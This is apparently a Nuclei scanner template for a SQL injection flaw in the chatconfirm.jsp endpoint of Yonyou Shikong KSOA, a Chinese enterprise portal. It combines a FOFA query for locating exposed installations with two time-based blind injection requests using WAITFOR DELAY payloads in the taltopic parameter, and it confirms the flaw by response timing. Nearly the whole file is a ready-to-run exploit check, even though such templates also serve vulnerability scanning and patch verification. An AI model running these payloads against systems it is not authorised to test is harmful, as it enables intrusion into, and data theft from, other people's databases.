id: yonyou-shikong-ksoa-chatconfirm-sqli
info:
  name: 用友时空KSOA chatconfirm接口SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="/servlet/com.sksoft.v8.cb.RandomImageGenerator"||(body="productKSOA"&&title="企业信息系统门户")
      reference: 通过chatconfirm接口参数传递未正确过滤特殊字符，导致攻击者可构造恶意SQL语句实现数据库查询操控。该漏洞可能引发敏感数据泄露及系统权限突破，需结合具体业务逻辑验证影响范围。
  tags: 用友时空KSOA
http:
- raw:
  - |
    GET /luntan/chatconfirm.jsp?taltopic=%27%3bWAITFOR+DELAY+%270%3a0%3a5%27-- HTTP/1.1
    Host: {{Hostname}}
  - |
    GET /luntan/chatconfirm.jsp?taltopic=%27%3bWAITFOR+DELAY+%270%3a0%3a8%27-- HTTP/1.1
    Host: {{Hostname}}
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
